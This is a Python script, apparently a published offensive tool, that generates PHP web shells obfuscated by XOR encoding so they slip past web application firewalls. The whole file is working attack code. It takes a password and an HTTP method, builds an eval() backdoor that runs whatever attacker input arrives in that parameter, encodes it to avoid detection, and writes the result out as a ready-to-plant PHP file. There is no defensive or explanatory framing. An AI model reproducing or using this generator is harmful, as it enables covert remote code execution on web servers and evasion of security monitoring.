import argparse
import string
import random
import re
from colorama import Fore

def banner():

    print("\n" +
          Fore.WHITE + "____  __________ __________   "  + Fore.RED + "_________ ___ ______________.____    .____   \n" +
          Fore.WHITE + "\   \/  /\   _  \\\\______   \\"  + Fore.RED + "/   _____//   |   \_   _____/|    |   |    | \n" +
          Fore.WHITE + " \     / /  /_\  \|       _/"  + Fore.RED + "\_____  \/    ~    \    __)_ |    |   |    |  \n" +
          Fore.WHITE + " /     \ \  \_/   \    |   \\"  + Fore.RED + "/        \    Y    /        \|    |___|    |___ \n" +
          Fore.WHITE + "/___/\  \ \_____  /____|_  "  + Fore.RED + "/_______  /\___|_  /_______  /|_______ \_______ \\\n" +
          Fore.WHITE + "      \_/       \/       \/        "  + Fore.RED + "\/       \/        \/         \/       \/ \n\n" +
          Fore.WHITE + "                                                        @ggboom993\n\n" +
          Fore.WHITE + "Usage：python3 -m/--method [GET\POST] -p/--password [password] -o/--output [output filename]\n"
          )

class XORpass():
    DEFAULT_CHARSET = string.ascii_letters + string.digits
    SEPARATORS = '()[]{}:;+-/ "'  # type: Any

    def _calc_xor_char(self, payload_char, charset=DEFAULT_CHARSET, randomize=True):
        for first_char in (charset if not randomize else "".join(random.sample(charset, len(charset)))):
            for second_char in (charset if not randomize else "".join(random.sample(charset, len(charset)))):
                third_char = chr(ord(first_char) ^ ord(second_char) ^ ord(payload_char))
                if third_char != payload_char and third_char in charset:
                    return [first_char, second_char, third_char]
        raise Exception("Charset not valid for this payload. char=%c charset=%s" % (payload_char, charset))

    def _calc_xor_string(self, payload, charset=DEFAULT_CHARSET, randomize=True):
        if payload[0] == '"':
            payload = payload[1:-1]
        result = ["", "", ""]
        for c in payload:
            xored_chars = self._calc_xor_char(c, charset=charset, randomize=randomize)
            for i in range(3):
                result[i] += xored_chars[i]

        return result

    def encode(self, payload, charset=DEFAULT_CHARSET, randomize=True, badchars=""):
        charset = "".join([x if x not in badchars else "" for x in charset])
        payload_array = re.split(r'(\"[\w\- ]+\")|([\w\.]+)', payload)
        result = ""
        for word in payload_array:
            if word == None: continue
            if word == "" or word in self.SEPARATORS:
                result += word
                continue

            xored_words = self._calc_xor_string(word, charset=charset, randomize=randomize)
            xored_words = ['"' + x + '"' for x in xored_words]

            result += "(" + "^".join(xored_words) + ")."

        while True:
            match = re.search(r'(\(\([\^\w\"]+)\)\)', result)
            if not match: break
            result = result.replace(match.group(0), match.group(0)[1:-1])
        return result


def main():
    banner()

    parser = argparse.ArgumentParser(description="Encoder to bypass WAF  using XOR operations.")
    parser.add_argument("--method", "-m", default="GET", help="Input your shell Method , only GET/POST")
    parser.add_argument("--password", "-p", default="cmd", help="Input your shell password")
    parser.add_argument("--output", "-o", help="Input output filename")
    args = parser.parse_args()

    if args is not None:
        print(Fore.CYAN + "[" + Fore.WHITE + "+" + Fore.CYAN + "] Method: " + Fore.WHITE + str(args.method.upper()))
        print(Fore.BLUE + "[" + Fore.WHITE + "*" + Fore.BLUE + "] Password: " + Fore.WHITE + str(args.password))

        try:
            p = "eval($_{}['{}']);".format(args.method.upper(), args.password)
            xor = XORpass().encode(p)
            webshell = "<?php\n$xor=" + xor[:-1] + ";\neval($xor);\n?>"
            print(Fore.GREEN + "[" + Fore.WHITE + "#" + Fore.GREEN + "] Encoded Payload:\n\n" + Fore.WHITE + webshell)

            if args.output is not None:
                with open(args.output, "w+") as f:
                    f.write(webshell)
                print(Fore.GREEN + "[" + Fore.WHITE + "#" + Fore.GREEN + "] Output Name:\n" + Fore.WHITE + args.output)
        except Exception as ex:
            print("Error encoding the payload: ", ex)


if __name__ == "__main__":
    main()